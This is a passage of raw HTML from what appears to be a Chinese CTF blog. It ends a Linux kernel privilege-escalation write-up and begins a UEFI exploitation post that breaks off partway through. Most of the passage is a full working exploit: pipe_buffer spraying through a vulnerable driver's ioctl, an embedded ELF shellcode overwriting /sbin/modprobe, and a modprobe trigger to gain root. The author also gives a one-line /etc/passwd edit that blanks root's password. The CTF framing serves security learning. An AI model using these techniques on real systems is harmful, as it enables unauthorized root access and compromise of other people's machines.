j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx, <span class="type">int</span> *<span class="built_in">array</span>, <span class="type">unsigned</span> <span class="type">long</span> size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    arg_struct.<span class="built_in">array</span> = <span class="built_in">array</span>;</span><br><span class="line">    arg_struct.size = size;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0001</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0003</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">empty</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    arg_struct.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0xdead0004</span>, &amp;arg_struct);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">544</span>] = &#123;</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x45</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0xE5</span>, <span class="number">0x74</span>, <span class="number">0x64</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>, <span class="number">0x74</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x2F</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x74</span>, <span class="number">0x78</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xD2</span>, <span class="number">0x31</span>, <span class="number">0xF6</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xBE</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x6A</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x5A</span>, <span class="number">0xBE</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0xF6</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">size_t</span> leak[<span class="number">0x80</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span>&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safe_compressor&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">    data[<span class="number">1</span>] = <span class="number">0x22222222</span>;</span><br><span class="line">    data[<span class="number">2</span>] = <span class="number">0x33333333</span>;</span><br><span class="line">    data[<span class="number">3</span>] = <span class="number">0x44444444</span>;</span><br><span class="line">    data[<span class="number">4</span>] = <span class="number">0x55555555</span>;</span><br><span class="line">    data[<span class="number">5</span>] = <span class="number">0x66666666</span>;</span><br><span class="line">    data[<span class="number">6</span>] = <span class="number">0x77777777</span>;</span><br><span class="line">    data[<span class="number">7</span>] = <span class="number">0x88888888</span>;</span><br><span class="line">    data[<span class="number">8</span>] = <span class="number">0x99999999</span>;</span><br><span class="line">    data[<span class="number">9</span>] = <span class="number">0xaaaaaaaa</span>;</span><br><span class="line">    data[<span class="number">10</span>] = <span class="number">0xbbbbbbbb</span>;</span><br><span class="line">    data[<span class="number">11</span>] = <span class="number">0xcccccccc</span>;</span><br><span class="line">    data[<span class="number">12</span>] = <span class="number">0xc0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;qian&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">120</span>; i++)&#123;</span><br><span class="line">        compress(i+<span class="number">1</span>,data,<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">4</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line">    read(pipe_fd[pointed_index][<span class="number">0</span>], &amp;leak, <span class="number">0x20</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;leak&quot;</span>, leak, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;try to over write file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/home/user/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/user/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然如果 &#x2F;bin&#x2F;su 有特权的话（RealWorld 中都是有的），我们可以直接将 &#x2F;etc&#x2F;passwd 中 root 用户改成：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::0:0:root:/root:/bin/sh</span><br></pre></td></tr></table></figure><p>也可以提权  </p><img src="/2025/01/09/Compressor/2.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>怎么想都不明白这么简单的题为什么会零解😇。闲的慌我去看了眼出题人的官方题解，发现其做法是充分利用题目提供的四种功能泄露出各种数据然后精心构造各种原语来搜索和修改 cred 结构体来实现提权。只能说这种方法确实强，可是太麻烦了，而且需要充分利用题目提供的四种功能来构造原语。而我只需要利用题目的 compress 功能即可实现提权，看来这次是我更甚一筹😋😋😋<br>想了想，当时这次比赛 r3kapig 以 20 分的分差落后第一名排第二，如果加上这题就能拉第一名 480 分  </p><img src="/2025/01/09/Compressor/1.png" class="" title="我的图图呢">  <p>看来这次又要背锅了😨<br>不过身为考研选手，今年 CTF 要少点碰了，该约束一下自己，除了 XCTF 和 defcon 其他比赛禁止参加😇</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UEFI Double GetVariable &amp; Heap OverFlow</title>
      <link href="/2025/01/06/uefi2/"/>
      <url>/2025/01/06/uefi2/</url>
      
        <content type="html"><![CDATA[<h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>上一篇文章<a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>简单的对 UEFI 的一些基础概念、漏洞出现方式以及攻击面进行了初步的学习，并且用了几道比较简单的题目进行练习。由于那些题目都是直接执行我们输入的 shellcode，和现实的情况有点脱节，而且对上一篇文章的部分攻击方式还带有一定的疑问，所以这里找了些题目来进行针对训练。  </p><h2 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable"></a>Double GetVariable</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>这里用的环境是 N1CTF2022 babyuefi。和我前面那篇<a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>不同，这里并没有直接给我们执行任意 shellcode 的机会，而是给了我们一个文件系统。我们可以看到 flag 就在这一个文件系统中，而我们并没有权限去读取该 flag 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Boot took 1.64 seconds!</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      init     proc     sbin     tmp</span><br><span class="line">dev      flag     linuxrc  root     sys      usr</span><br><span class="line">/ $ <span class="built_in">cat</span> flag</span><br><span class="line"><span class="built_in">cat</span>: can<span class="string">&#x27;t open &#x27;</span>flag<span class="string">&#x27;: Permission denied</span></span><br><span class="line"><span class="string">/ $ whoami</span></span><br><span class="line"><span class="string">whoami: unknown uid 1000</span></span><br><span class="line"><span class="string">/ $ 